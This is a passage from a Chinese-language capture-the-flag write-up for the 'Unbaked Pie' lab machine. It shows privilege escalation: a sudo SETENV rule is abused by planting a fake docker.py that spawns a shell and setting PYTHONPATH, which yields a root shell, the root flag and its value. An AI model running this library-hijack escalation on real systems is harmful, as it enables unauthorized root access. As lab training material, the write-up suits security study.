    (root) SETENV: NOPASSWD: /usr/bin/python /opt/dockerScript.py
oliver@unbaked:~$ cat /opt/dockerScript.py
import docker

# oliver, make sure to restart docker if it crashes or anything happened.
# i havent setup swap memory for it
# it is still in development, please dont let it live yet!!!
client = docker.from_env()
client.containers.run("python-django:latest", "sleep infinity", detach=True)
```

因为可以设置环境，所以可以尝试劫持环境变量和库进行提权：

```bash
oliver@unbaked:~$ cd /tmp
oliver@unbaked:/tmp$ echo 'import pty;pty.spawn("/bin/bash")' > docker.py
oliver@unbaked:/tmp$ sudo PYTHONPATH=/tmp python /opt/dockerScript.py
root@unbaked:/tmp# cd /root
root@unbaked:/root# ls -la
total 32
drwx------  4 root root 4096 Oct  3  2020 .
drwxr-xr-x 23 root root 4096 Oct  3  2020 ..
-rw-------  1 root root   39 Oct  5  2020 .bash_history
-rw-r--r--  1 root root 3106 Oct 23  2015 .bashrc
drwx------  3 root root 4096 Oct  3  2020 .cache
drwxr-xr-x  2 root root 4096 Oct  3  2020 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root  129 Oct  3  2020 root.txt
root@unbaked:/root# cat root.txt 
CONGRATS ON PWNING THIS BOX!
Created by ch4rm & H0j3n
ps: dont be mad us, we hope you learn something new

flag: Unb4ked_GOtcha!
```

## 参考

https://nullvector0.notion.site/unbaked-5c37935d31c240c28c4878c6c9d66c09

https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/HackMyVM/Machines/UnbakedPie/

https://www.bilibili.com/video/BV1sx4y1y7Jz/